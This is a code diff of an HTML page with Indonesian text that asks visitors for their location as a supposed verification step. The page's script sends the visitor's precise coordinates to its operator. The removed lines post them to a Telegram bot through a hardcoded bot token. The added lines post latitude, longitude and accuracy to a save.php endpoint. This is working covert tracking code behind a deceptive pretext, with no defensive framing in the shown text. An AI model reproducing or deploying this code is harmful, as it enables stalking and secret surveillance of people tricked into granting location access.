@@ -83,41 +83,34 @@
 </div>
 
 <script>
-const BOT_TOKEN = "AAEeMrSz925P-_ebsZ38__7bvISb2O9CYEg";
-const CHAT_ID   = "913215740";
-
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(
     function (position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy
+      };
 
       document.getElementById("status").innerText =
         "Verifikasi lokasi berhasil.";
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      fetch("save.php", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: `📍 Lokasi terverifikasi:\nhttps://maps.google.com/?q=${lat},${lon}`
-        })
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
       });
     },
     function () {
       document.getElementById("status").innerText =
         "Akses lokasi diperlukan untuk melanjutkan proses.";
-    },
-    {
-      enableHighAccuracy: true,
-      timeout: 10000
     }
   );
-} else {
-  document.getElementById("status").innerText =
-    "Browser tidak mendukung fitur lokasi.";
 }
 </script>
+
 
 </body>
 </html>
